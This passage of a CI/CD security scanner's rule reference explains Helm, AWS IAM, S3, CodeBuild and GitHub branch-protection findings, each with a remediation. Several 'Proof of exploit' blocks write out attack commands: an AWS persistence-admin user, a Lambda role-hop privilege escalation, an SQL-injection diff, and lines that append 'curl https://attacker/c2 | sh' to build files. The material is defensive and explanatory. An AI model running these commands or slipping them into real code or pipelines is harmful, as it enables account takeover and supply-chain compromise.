**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`HELM-003`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-004`: Chart dependency version is a range, not an exact pin <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-helm-004 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** An exact pin is a string that contains only digits, dots, and at most a single leading ``v`` / trailing pre-release or build identifier (``1.2.3``, ``v1.2.3``, ``1.2.3-rc1``, ``1.2.3+build.5``). Anything carrying ``^`` / ``~`` / ``>`` / ``<`` / ``*`` / ``x`` / ``X`` / ``||`` / a space (``>=4 <5``) is treated as a range. The bias is toward false positives, a chart maintainer can suppress per-rule via ``--ignore-file`` if they specifically want range semantics, but the default for production charts is a pin.

**Recommendation.** Replace each ``dependencies[].version`` constraint with the exact resolved version from ``Chart.lock``. ``17.0.0`` instead of ``^17.0.0``, ``v1.2.3`` instead of ``~1.2``. Range syntax (``^``, ``~``, ``>=``, ``*``, ``x``) lets ``helm dependency update`` move every consumer of the chart to a newer dep on the next refresh, even when the lock file looked stable.

**Source:** [`HELM-004`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-005`: Chart maintainers field empty or missing chain-of-custody info <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-005 }

**Evidences:** [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** An ``maintainers:`` entry is considered usable when the value is a YAML mapping with ``name:`` set to a non-empty string and at least one of ``email:`` / ``url:`` populated. Entries that look like ``- name: TODO`` or carry blank contact fields fail the rule the same way a missing block does, the field exists but doesn't carry a real chain-of-custody signal.

**Recommendation.** Populate ``maintainers:`` in ``Chart.yaml`` with at least one entry carrying a ``name`` plus either an ``email`` or a ``url``. The ``name`` is the human a downstream consumer files an issue against; the contact field is the channel they reach. Charts published to ArtifactHub or an internal registry without this field are silently anonymous, fine for a personal scratch chart, not for one your CI pipeline will deploy to production.

**Known false positives.**

- Library charts (``Chart.yaml`` ``type: library``) often ship without maintainers when distributed inside a single team's monorepo where the org-level CODEOWNERS already names the contact. Suppress with ``--ignore-file`` when this matches your situation.

**Source:** [`HELM-005`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-006`: Chart.yaml does not declare a kubeVersion compatibility range <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-006 }

**Evidences:** [`2.3.8`](#ctrl-2-3-8) Ensure pipeline configuration files are reviewed before execution.

**How this is detected.** The field is a string carrying a Helm-flavoured SemVer range. Empty / missing fails the rule. Whitespace-only values fail too, an obviously-blank key should not satisfy a posture check.

**Recommendation.** Add a ``kubeVersion:`` SemVer range to ``Chart.yaml`` covering the Kubernetes versions you've actually rendered and tested the chart against. ``>= 1.25.0 < 1.32.0`` is the common shape for a chart maintained against the upstream support window. Helm will refuse ``helm install`` against a cluster whose ``kubectl version`` falls outside the range, catching silent-breakage surprises (removed apiVersions, renamed RBAC verbs, alpha features) at pre-flight rather than at runtime.

**Known false positives.**

- Library charts (``Chart.yaml`` ``type: library``) that wrap version-agnostic helpers often legitimately ship without ``kubeVersion``. Suppress with ``--ignore-file`` when the chart genuinely targets every supported Kubernetes minor.

**Source:** [`HELM-006`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-007`: Chart.yaml description field is empty or missing <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-007 }

**Evidences:** [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** Walks ``Chart.yaml`` ``description:`` and fires when the field is missing, ``None``, or a string that's empty after stripping whitespace. The Helm chart spec doesn't enforce the field but every chart published to ArtifactHub or the upstream stable repo populates it; production charts that ship without it are usually a copy-paste-from-template oversight.

**Recommendation.** Set ``description:`` in ``Chart.yaml`` to a one-sentence summary of what the chart deploys (e.g. ``description: Postgres 14 cluster with WAL-G backups and a Prometheus exporter``). Helm registries display this string in chart listings; without it, anyone browsing has to read the README to figure out what the chart does.

**Source:** [`HELM-007`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-008`: Chart.lock generated more than 90 days ago <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-helm-008 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** Reads ``Chart.lock``'s top-level ``generated:`` timestamp (an ISO-8601 string Helm writes when the lock was last regenerated) and compares against ``now``. Fires when the delta is more than 90 days. Charts without ``Chart.lock`` are skipped. HELM-002 covers the missing-lock case directly. Charts whose ``generated:`` field is malformed or absent silently pass on this rule (HELM-002 covers the absent-lock case from a different angle).

**Recommendation.** Run ``helm dependency update`` against every dependency-carrying chart at least once per release cycle, and commit the regenerated ``Chart.lock``. The lock pins versions and digests; the *update cadence* is what brings in CVE fixes and deprecation notices from the last quarter. CI can run the same command against ``main`` weekly to surface drift as a PR rather than letting the lock sit stale until the next release.

**Known false positives.**

- A chart that pins exact versions and never needs new dependencies (e.g. a chart packaging a single internal library that itself updates rarely) may legitimately have a stale Chart.lock. Suppress with ``--ignore-file`` when this matches your situation.

**Source:** [`HELM-008`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-009`: Chart home / sources URL uses a non-HTTPS scheme <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-009 }

**Evidences:** [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Walks ``Chart.yaml`` ``home:`` (single string) and ``sources:`` (list of strings). Fires on any value whose scheme is ``http://``, ``ftp://``, or other plaintext form. Empty / missing fields pass, the rule only evaluates URLs that are *populated* with the wrong scheme. HELM-003 covers the same risk for dependency-repo URLs.

**Recommendation.** Switch every ``home:`` URL and every entry in ``sources:`` to ``https://``. Most chart-listing UIs display these as click-through links from a public chart registry; serving them over plaintext is a confused-deputy footgun for anyone evaluating the chart's provenance. ``http://`` URLs against ``localhost`` are not exempted, production charts shouldn't ship references to a developer-local endpoint anyway.

**Source:** [`HELM-009`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `HELM-010`: Chart.yaml appVersion field is empty or missing <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-010 }

**Evidences:** [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** Library charts (``Chart.yaml`` ``type: library``) legitimately don't have an ``appVersion`` because they package no application. Those are exempted. For application charts (``type: application``, the default), ``appVersion`` is required for CVE tracking and release-tracking; without it, ``helm list`` shows ``-`` in the AppVersion column and downstream consumers have no signal.

**Recommendation.** Set ``appVersion:`` in ``Chart.yaml`` to the version of the application the chart packages (e.g. ``appVersion: "17.2"`` for a Postgres-17.2 chart at ``version: 1.4.2``). When the upstream application releases, bump ``appVersion`` and re-cut the chart. Helm's CLI displays ``appVersion`` alongside the chart version in ``helm list``, so downstream operators can see which app version is running where.

**Source:** [`HELM-010`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

#### `IAM-001`: CI/CD role has AdministratorAccess policy attached <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-iam-001 }

**Evidences:** [`2.4.3`](#ctrl-2-4-3) Ensure access to the pipeline execution environment is restricted.

**How this is detected.** A CI/CD service role with ``AdministratorAccess`` attached turns any pipeline compromise into account compromise. The classic anti-pattern: the role started narrow, the pipeline grew, someone attached AdministratorAccess to unblock a deploy, and it never came off.

**Recommendation.** Replace AdministratorAccess with least-privilege policies.

**Proof of exploit.**

# Vulnerable: CodeBuild service role with AdministratorAccess.
# (Terraform shown for clarity; the actual finding comes from
# live ListAttachedRolePolicies on the role.)
resource "aws_iam_role" "codebuild" {
  name               = "codebuild-deploy"
  assume_role_policy = data.aws_iam_policy_document.cb_trust.json
}
resource "aws_iam_role_policy_attachment" "admin" {
  role       = aws_iam_role.codebuild.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

# Attack: any compromise of the build (poisoned dependency,
# leaked buildspec edit, malicious PR merged to the branch
# CodeBuild trusts) runs as a principal with full account
# permissions. From a build shell:
#
#   aws iam create-user --user-name persistence
#   aws iam attach-user-policy --user-name persistence \
#     --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
#   aws iam create-access-key --user-name persistence
#
# Game over: out-of-band admin, no IP gate, survives every
# subsequent rotation of the CodeBuild role itself.

# Safe: scope the role to the resources the pipeline actually
# touches. ``AdministratorAccess`` is never the right answer
# for an automation principal.
resource "aws_iam_role_policy" "codebuild_least_priv" {
  role   = aws_iam_role.codebuild.id
  policy = data.aws_iam_policy_document.deploy_specific.json
}

**Source:** [`IAM-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `IAM-002`: CI/CD role has wildcard Action in attached policy <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-002 }

**Evidences:** [`2.4.3`](#ctrl-2-4-3) Ensure access to the pipeline execution environment is restricted.

**How this is detected.** ``Action: '*'`` (or service-prefix wildcards like ``s3:*``) on an attached policy is functionally equivalent to AdministratorAccess for that resource. The wildcard absorbs every new IAM action AWS adds, so the role's authority grows without any local change.

**Recommendation.** Replace wildcard actions with specific IAM actions.

**Source:** [`IAM-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `IAM-003`: CI/CD role has no permission boundary <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-iam-003 }

**Evidences:** [`2.4.3`](#ctrl-2-4-3) Ensure access to the pipeline execution environment is restricted.

**How this is detected.** A permissions boundary is the maximum-permission ceiling for a role. Without one, every future PR that attaches another inline / managed policy raises the role's effective authority indefinitely. With a boundary in place, the policy churn happens beneath a fixed cap that your security team owns separately.

**Recommendation.** Attach a permissions boundary defining max permissions.

**Source:** [`IAM-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `IAM-004`: CI/CD role can PassRole to any role <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-004 }

**Evidences:** [`2.4.3`](#ctrl-2-4-3) Ensure access to the pipeline execution environment is restricted.

**How this is detected.** ``iam:PassRole`` with ``Resource: '*'`` lets the principal hand any role to any service. Combined with a service that runs your code (Lambda, ECS, CodeBuild, EC2 Instance Profiles), this is role-hop privilege escalation: launch an ephemeral resource configured with a higher-privileged role, run code under that identity, exfil. Scoping by ARN + ``iam:PassedToService`` removes the escalation path.

**Recommendation.** Restrict iam:PassRole to specific role ARNs and add an iam:PassedToService condition.

**Proof of exploit.**

# Vulnerable: pipeline role grants PassRole with Resource: '*'.
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["iam:PassRole", "lambda:CreateFunction",
                "lambda:InvokeFunction"],
    "Resource": "*"
  }]
}

# Attack: from a build shell, create a Lambda configured with
# the highest-privileged role you can name and invoke it:
#
#   aws lambda create-function --function-name pwn \
#     --role arn:aws:iam::123456789012:role/prod-admin \
#     --runtime python3.12 --handler i.h \
#     --zip-file fileb://payload.zip
#   aws lambda invoke --function-name pwn /tmp/out
#
# The Lambda now runs as ``prod-admin`` even though the
# pipeline principal never had that role's permissions
# directly. Classic role-hop privilege escalation.

# Safe: pin to one role ARN AND require the pass be scoped
# to the service that legitimately consumes it.
{
  "Effect": "Allow",
  "Action": "iam:PassRole",
  "Resource": "arn:aws:iam::123456789012:role/lambda-deploy-target",
  "Condition": {
    "StringEquals": {"iam:PassedToService": "lambda.amazonaws.com"}
  }
}

**Source:** [`IAM-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `IAM-005`: CI/CD role trust policy missing sts:ExternalId <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-005 }

**Evidences:** [`1.3.4`](#ctrl-1-3-4) Ensure organization identity is required for contribution (no long-lived personal tokens), [`2.4.3`](#ctrl-2-4-3) Ensure access to the pipeline execution environment is restricted.

**How this is detected.** A trust policy that lets an external AWS account assume the role without an ``sts:ExternalId`` condition is vulnerable to the confused-deputy pattern: a third-party SaaS configured with your role ARN can also be used by another customer of that SaaS to assume your role (if they know the ARN). ``sts:ExternalId`` ties the role to a specific tenancy.

**Recommendation.** Add a Condition requiring sts:ExternalId for external principals.

**Source:** [`IAM-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `IAM-006`: Sensitive actions granted with wildcard Resource <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-iam-006 }

**Evidences:** [`2.4.3`](#ctrl-2-4-3) Ensure access to the pipeline execution environment is restricted.

**How this is detected.** IAM-002 catches ``Action: "*"``. IAM-006 catches the more common "scoped action, unscoped resource" pattern on sensitive services (S3/KMS/SecretsManager/SSM/IAM/STS/DynamoDB/Lambda/EC2).

**Recommendation.** Scope the Resource element to specific ARNs (buckets, keys, secrets, roles).

**Source:** [`IAM-006`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `PBAC-001`: CodeBuild project has no VPC configuration <span class="pg-sev pg-sev--high">HIGH</span> { #detail-pbac-001 }

**Evidences:** [`2.1.6`](#ctrl-2-1-6) Ensure build workers have minimal network connectivity.

**How this is detected.** A CodeBuild project with no VPC configuration runs in AWS-managed network space, egress to the public internet is unrestricted, every package registry / CDN / arbitrary endpoint is reachable. Inside a VPC, security-group + VPC-endpoint policies become the egress gate, which is the only practical way to limit a compromised build's exfiltration paths.

**Recommendation.** Configure the CodeBuild project to run inside a VPC with appropriate subnets and security groups. Use a NAT gateway or VPC endpoints to control outbound internet access and restrict build nodes to only the network resources they require.

**Source:** [`PBAC-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `PBAC-002`: CodeBuild service role shared across multiple projects <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-pbac-002 }

**Evidences:** [`2.2.2`](#ctrl-2-2-2) Ensure build workers are single-use, [`2.4.3`](#ctrl-2-4-3) Ensure access to the pipeline execution environment is restricted.

**How this is detected.** One CodeBuild service role across many projects means a compromise of any project's build environment grants access to whatever resources every other project's build needs. Per-project roles cap the radius, a backdoor in the ``foo-tests`` build can't reach the ``deploy-prod`` build's secrets if they each have their own role.

**Recommendation.** Create a dedicated IAM service role for each CodeBuild project, scoped to only the permissions that specific project requires. This limits the blast radius if one project's build is compromised.

**Source:** [`PBAC-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `S3-001`: Artifact bucket public access block not fully enabled <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-s3-001 }

**Evidences:** [`4.2.1`](#ctrl-4-2-1) Ensure access to artifacts is limited.

**How this is detected.** S3 Block Public Access is the bucket-level circuit breaker that supersedes any future ACL or bucket-policy edit. Without all four settings enabled, a misconfigured CloudFormation change or a stray ``aws s3api`` call can re-expose the bucket to the public, even if the bucket had previously been private.

**Recommendation.** Enable all four S3 Block Public Access settings on the artifact bucket: BlockPublicAcls, IgnorePublicAcls, BlockPublicPolicy, and RestrictPublicBuckets.

**Source:** [`S3-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `S3-002`: Artifact bucket server-side encryption not configured <span class="pg-sev pg-sev--high">HIGH</span> { #detail-s3-002 }

**Evidences:** [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked).

**How this is detected.** Default bucket encryption applies SSE-S3 (AES256) to every PutObject. As of January 2023, AWS enables this on all new buckets automatically, but existing buckets created before then can still be unencrypted unless explicitly configured. Without it, individual objects can be uploaded without encryption (the client gets to choose).

**Recommendation.** Enable default bucket encryption using at minimum AES256 (SSE-S3). For stronger key control, use SSE-KMS with a customer-managed key.

**Source:** [`S3-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `S3-003`: Artifact bucket versioning not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-s3-003 }

**Evidences:** [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked), [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** Versioning makes overwrites and deletes recoverable: the previous content of an object survives until lifecycle expires it. Without versioning, an artifact overwrite (a bad pipeline run, a malicious replacement, a typo'd ``aws s3 cp``) is unrecoverable, the original bytes are gone.

**Recommendation.** Enable S3 versioning on the artifact bucket so that previous artifact versions are retained and rollback is possible. Combine with a lifecycle rule to expire old versions after a retention period.

**Source:** [`S3-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `S3-004`: Artifact bucket access logging not enabled <span class="pg-sev pg-sev--low">LOW</span> { #detail-s3-004 }

**Evidences:** [`2.3.7`](#ctrl-2-3-7) Ensure pipeline steps produce audit logs, [`5.2.3`](#ctrl-5-2-3) Ensure deployment environment activity is audited.

**How this is detected.** S3 server access logging records every API operation against the bucket, who, when, what object, what method. CloudTrail data events overlap but cost more; access logs are the cheap baseline. Without them, an exfiltration via ``GetObject`` doesn't leave a trail you can investigate.

**Recommendation.** Enable S3 server access logging for the artifact bucket and direct logs to a separate, centralized logging bucket with restricted write access.

**Source:** [`S3-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `S3-005`: Artifact bucket missing aws:SecureTransport deny <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-s3-005 }

**Evidences:** [`4.2.1`](#ctrl-4-2-1) Ensure access to artifacts is limited.

**How this is detected.** S3 endpoints accept HTTP and HTTPS by default. Without an explicit Deny on ``aws:SecureTransport=false``, a plaintext request, typically from a misconfigured client or a SDK with a stale endpoint, is honored if signed. The bucket policy Deny is the only enforcement; no account-level switch covers it.

**Recommendation.** Add a Deny statement for s3:* with Bool aws:SecureTransport=false.

**Source:** [`S3-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `SCM-001`: Default branch has no protection rule <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-001 }

**Evidences:** [`1.1.17`](#ctrl-1-1-17) Ensure default branches' commits are protected from being deleted/rewritten.

**How this is detected.** Without a branch protection rule on the default branch, anyone with write access can force-push, delete the branch, or merge directly without review. Even when CI runs on the branch, an unprotected default branch lets a single compromised maintainer rewrite history and erase the audit trail. The check is sourced from the GitHub REST API (``GET /repos/{owner}/{repo}/branches/{branch}/protection``); a 404 response is itself the failure signal.

**Recommendation.** Add a branch protection rule on the default branch in the repository's Settings -> Branches. At minimum require pull request reviews before merging, require status checks to pass, and disable force-pushes / deletions. Match the rule to OpenSSF Scorecard's Branch-Protection thresholds for the organization's compliance baseline.

**Seen in the wild.**

- Numerous post-incident reports (PyPI / RubyGems package compromises 2018-2024) trace the initial maintainer-account takeover step to the absence of branch protection: the attacker pushed a single tampered commit to the default branch, the release pipeline ran on push, the malicious build shipped to the registry within minutes, and recovery required force-pushing the audit trail itself. Branch protection turns the entire class of attack into a review-then-merge gate.

**Proof of exploit.**

# With no protection rule on ``main``, a single compromised
# maintainer credential is enough to ship a tampered build:
#
#   git checkout main
#   echo 'curl https://attacker/c2 | sh' >> Makefile
#   git commit -am 'fix: tweak'
#   git push origin main           # no review required
#   # CI now runs the tampered build with full secret access.
#
# Recovery needs force-push to rewrite the trail:
#   git push --force origin main   # also unprotected
#
# A protection rule with `required_pull_request_reviews` set
# and `allow_force_pushes: false` blocks both the push and
# the rewrite without giving up an inch of velocity.

**Source:** [`SCM-001`](../providers/scm.md#scm-001) in the [SCM provider](../providers/scm.md).

#### `SCM-002`: Default branch protection does not require pull request reviews <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-002 }

**Evidences:** [`1.1.5`](#ctrl-1-1-5) Ensure any change to code requires the review of additional strong authenticators.

**How this is detected.** Reads ``required_pull_request_reviews.required_approving_review_count`` from the branch protection payload. Fires when the field is absent (no review requirement at all) or when the count is 0. ``SCM-001`` covers the case where no protection rule exists; this rule scopes specifically to the review-count knob inside an existing rule.

**Recommendation.** In the default-branch protection rule, enable ``Require a pull request before merging`` and set the minimum approving review count to at least 1 (Scorecard's threshold for Branch-Protection's middle tier; raise to 2 for higher trust). Combine with ``Dismiss stale pull request approvals when new commits are pushed`` so a force-push doesn't carry an old approval forward.

**Known false positives.**

- ``required_pull_request_reviews.bypass_pull_request_allowances`` is covered by ``SCM-018``: a protection rule that requires reviews but lists every contributor in the bypass allowlist still passes this rule even though the control is unenforced in practice. Read SCM-002 + SCM-018 as a pair when auditing whether required review actually fires.

**Proof of exploit.**

# With protection but no required reviews, a maintainer can
# self-approve a tampered change in two clicks:
#
#   git checkout -b release-fix
#   echo 'curl https://attacker/c2 | sh' >> deploy.sh
#   git commit -am 'fix: handle edge case'
#   git push origin release-fix
#   gh pr create --fill
#   gh pr merge --squash --auto    # no second-set-of-eyes
#   # Release pipeline runs the tampered build with full
#   # production secrets in scope.
#
# Setting ``required_approving_review_count`` to >= 1 forces
# a separate identity to acknowledge the change before merge.

**Source:** [`SCM-002`](../providers/scm.md#scm-002) in the [SCM provider](../providers/scm.md).

#### `SCM-003`: GitHub default code scanning is not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-003 }

**Evidences:** [`1.1.7`](#ctrl-1-1-7) Ensure any change to code is automatically scanned for risks (SAST).

**How this is detected.** Reads ``state`` from the default code-scanning setup endpoint (``GET /repos/{owner}/{repo}/code-scanning/default-setup``). Fires when ``state`` is anything other than ``configured`` (``not-configured``, missing, or 404). This check only evaluates the default-setup endpoint. Repos running hand-authored CodeQL workflows or third-party SARIF uploads can still fail SCM-003; suppress per repo via ignore-file when that alternative coverage is intentional.

**Recommendation.** Enable default code scanning under the repository's Settings -> Code security -> Code scanning -> Default. The GitHub-managed CodeQL setup picks the right languages automatically and writes findings into the Code Scanning UI on every push and PR. Teams that already ship a CodeQL workflow can leave this rule's check off — but the default setup is the lowest-friction path for repos that don't have one.

**Known false positives.**

- Repos that ship a hand-authored CodeQL workflow (or use Semgrep / Snyk / another SAST whose results land in the Code Scanning UI via SARIF upload) get the same coverage without enabling default setup. Suppress via ignore-file rather than removing the rule.

**Proof of exploit.**

# Without code scanning, the only signal that a PR
# introduces (e.g.) a SQL injection or hardcoded secret
# comes from the human reviewer:
#
#   - def lookup(user_id):
#   -     return db.query("SELECT * FROM u WHERE id = ?", user_id)
#   + def lookup(user_id):
#   +     return db.query(f"SELECT * FROM u WHERE id = {user_id}")
#
# A reviewer skimming a 400-line PR misses this. Default
# CodeQL setup catches the same change as a CWE-89 finding
# in the PR check, surfaces it inline in the diff, and
# blocks the merge if the protection rule wires it up as
# a required status check (see SCM-008).

**Source:** [`SCM-003`](../providers/scm.md#scm-003) in the [SCM provider](../providers/scm.md).

#### `SCM-004`: GitHub secret scanning is not enabled <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-004 }

**Evidences:** [`1.5.1`](#ctrl-1-5-1) Ensure scanners are in place to identify and prevent sensitive data in code.

**How this is detected.** Reads ``security_and_analysis.secret_scanning.status`` from the repo metadata payload. Fires when the value is anything other than ``enabled``. Public repos get secret scanning free since 2023; private repos require a GitHub Advanced Security license. Without secret scanning, a credential committed even briefly is recoverable from git history indefinitely.

**Recommendation.** Enable secret scanning under the repository's Settings -> Code security -> Secret scanning. The GitHub-managed scanner covers ~200 token patterns from major providers and runs on every push. Pair with push protection so secrets are blocked at commit time rather than caught after the fact.

**Known false positives.**

- When the scanning token lacks ``admin`` scope on the repo, the ``security_and_analysis`` block is omitted from the API response and this rule cannot tell ``disabled`` from ``unknown``. The fix is to grant the token admin scope on the repo (or re-run with a personal token from a maintainer) rather than to suppress the rule.

**Seen in the wild.**

- GitGuardian's annual State of Secrets Sprawl reports find millions of fresh credential leaks per year across public GitHub commits, with the median time-to-revocation measured in days. Native secret scanning alerts the maintainer within minutes of the push, collapsing the exploitable window from days to minutes for the patterns it covers.

**Source:** [`SCM-004`](../providers/scm.md#scm-004) in the [SCM provider](../providers/scm.md).

#### `SCM-005`: Dependabot security updates are not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-005 }

**Evidences:** [`1.1.8`](#ctrl-1-1-8) Ensure scanners are in place to identify and confirm presence of vulnerabilities (SCA).

**How this is detected.** Reads ``security_and_analysis.dependabot_security_updates.status`` from the repo metadata payload. Fires when the value is anything other than ``enabled``. Without security updates, the team has to discover and triage CVEs against their dependency graph manually — a delay measured in days or weeks even on attentive teams, vs hours when the bot opens the PR for them.

**Recommendation.** Enable Dependabot security updates under the repository's Settings -> Code security -> Dependabot. The bot opens a PR with the minimum-required upgrade for each open advisory against an in-use dependency. Pair with version-update config (``.github/dependabot.yml``) so routine bumps don't rely on the security-update path.

**Known false positives.**

- When the scanning token lacks ``admin`` scope on the repo, the ``security_and_analysis`` block is omitted from the API response and this rule cannot tell ``disabled`` from ``unknown``. Re-run with admin scope to confirm.
- Repos that delegate dependency-update PRs to Renovate, Snyk, or another bot get equivalent coverage without Dependabot. Suppress via ignore-file rather than removing the rule.

**Source:** [`SCM-005`](../providers/scm.md#scm-005) in the [SCM provider](../providers/scm.md).

#### `SCM-006`: Default branch protection does not require signed commits <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-006 }

**Evidences:** [`1.1.6`](#ctrl-1-1-6) Ensure any change to code is signed.

**How this is detected.** Reads ``required_signatures.enabled`` from the branch protection payload. Fires when the field is missing or False. Required signatures don't validate signature authenticity (the GitHub web UI does that lazily on render), but a missing signature is rejected at push time, which blocks the most common compromise pattern: a stolen personal access token used to push under the maintainer's name without their signing key.

**Recommendation.** In the default-branch protection rule, enable ``Require signed commits``. Configure GPG, SSH, or S/MIME signatures for every contributor's git client (``git config commit.gpgsign true`` plus an uploaded public key). Pair with branch protection's ``Restrict who can push to matching branches`` so only signed commits from authorized identities land on the default branch.

**Source:** [`SCM-006`](../providers/scm.md#scm-006) in the [SCM provider](../providers/scm.md).

#### `SCM-007`: Default branch protection allows force-pushes <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-007 }

**Evidences:** [`1.1.17`](#ctrl-1-1-17) Ensure default branches' commits are protected from being deleted/rewritten.

**How this is detected.** Reads ``allow_force_pushes.enabled`` from the branch protection payload. Fires when the value is True. The complementary deletion-protection knob is covered by ``SCM-009``; this rule focuses on the rewrite-history attack class because force-push is the primitive every post-incident rewrite uses to clean up after itself.

**Recommendation.** In the default-branch protection rule, set ``Allow force pushes`` to ``Disabled``. Force-pushes overwrite the audit trail; an attacker who lands a malicious commit can erase evidence of it after the fact. Also set ``Allow deletions`` to ``Disabled`` so the branch itself can't be wiped.

**Source:** [`SCM-007`](../providers/scm.md#scm-007) in the [SCM provider](../providers/scm.md).

#### `SCM-008`: Default branch protection does not require status checks <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-008 }

**Evidences:** [`1.1.5`](#ctrl-1-1-5) Ensure any change to code requires the review of additional strong authenticators, [`1.1.7`](#ctrl-1-1-7) Ensure any change to code is automatically scanned for risks (SAST).

**How this is detected.** Reads ``required_status_checks.contexts`` (or the newer ``checks`` shape) from the branch protection payload. Fires when the field is missing or the contexts list is empty. Without required checks the merge gate degrades to human-only review; SCM-002 covers the review knob, this rule covers the automated-verification knob, and both should be on for high-trust default branches.

**Recommendation.** In the default-branch protection rule, enable ``Require status checks to pass before merging`` and list every check the team relies on (CI build, code scanning, secret scanning, lint). Set ``strict: true`` (``Require branches to be up to date before merging``) so a stale base doesn't land regressions the latest checks would catch.

**Known false positives.**

- The ``restrictions`` block (users / teams / apps allowed to push directly to the protected branch) is not consulted today: a rule that requires status checks but lists every contributor in the push-restrictions allowlist still passes this rule even though those identities can land code without the checks running. Audit the allowlist in the GitHub UI when this rule passes on a high-trust repo.
- Status-check names are matched as opaque strings; a configured required check that no workflow actually emits (typo, deleted job) will still pass this rule. The check would block the merge in practice (GitHub waits for the named context forever), but the misconfiguration itself isn't visible from the protection payload.

**Source:** [`SCM-008`](../providers/scm.md#scm-008) in the [SCM provider](../providers/scm.md).

#### `SCM-009`: Default branch protection allows branch deletion <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-009 }

**Evidences:** [`1.1.17`](#ctrl-1-1-17) Ensure default branches' commits are protected from being deleted/rewritten.

**How this is detected.** Reads ``allow_deletions.enabled`` from the branch protection payload. Fires when the value is True. Pairs with SCM-007 (force-push allowed) — the two flags together cover the complete rewrite-history attack class.

**Recommendation.** In the default-branch protection rule, set ``Allow deletions`` to ``Disabled``. A deleted default branch wipes every protection rule attached to it; an attacker with write access can delete the branch, recreate it from a tampered commit, and re-apply protection in a way that looks identical from the UI.

**Source:** [`SCM-009`](../providers/scm.md#scm-009) in the [SCM provider](../providers/scm.md).

#### `SCM-010`: Branch protection allows administrators to bypass <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-010 }

**Evidences:** [`1.1.5`](#ctrl-1-1-5) Ensure any change to code requires the review of additional strong authenticators.

**How this is detected.** Reads ``enforce_admins.enabled`` from the branch protection payload. Fires when the value is False or the field is missing. Pairs with every other SCM-NNN rule that reads a branch-protection knob — without enforce_admins, those rules document intent rather than reality.

**Recommendation.** In the default-branch protection rule, enable ``Do not allow bypassing the above settings`` (a.k.a. ``Include administrators``). Otherwise every other knob you set (required reviews, status checks, signed commits) becomes advisory rather than enforced. A compromised admin account is also a much shorter path to a tampered release than a compromised contributor account, so admins are exactly the identity the gate needs to apply to.

**Source:** [`SCM-010`](../providers/scm.md#scm-010) in the [SCM provider](../providers/scm.md).

#### `SCM-011`: Default branch protection does not require CODEOWNERS reviews <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-011 }

